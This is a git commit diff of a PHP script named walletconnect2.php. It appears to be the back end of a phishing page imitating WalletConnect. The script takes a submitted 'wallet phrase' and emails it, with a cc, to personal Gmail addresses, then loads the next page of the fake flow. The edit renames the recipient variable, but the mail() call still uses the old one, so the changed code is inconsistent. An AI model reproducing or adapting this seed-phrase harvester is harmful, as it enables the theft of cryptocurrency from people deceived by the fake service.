4398a222aea060b451fe66996f8d5212412e9ecd
stormDtech <117129513+stormDtech@users.noreply.github.com>
2023-03-13 23:21:59 +0100

    Add files via upload

--- walletconnect2.php
+++ walletconnect2.php
@@ -1,14 +1,15 @@
 <?php
-if(isset($_POST['submit']))
-$to="dgonyedikachi@gmail.com";
+if(isset($_POST['submit'])) {
+$mailto="godwindon080@gmail.com";
 $text=$_POST['text'];
 $subject="phrase";
 $txt="Your wallet phrase: $text";
-$headers="From: stormDtech@gmail.com"."\r\n". "cc:godwinprosperchiegosike@gmail.com";
+$headers="From: dgonyedikachi@gmail.com"."\r\n". "cc:godwinprosperchiegosike@gmail.com";
+}
 if(mail($to,$subject,$txt,$headers)) {
 	readfile("walletconnect3.html");
 
 ;}
 else{
 	echo "failed";}
-?>
+?>															
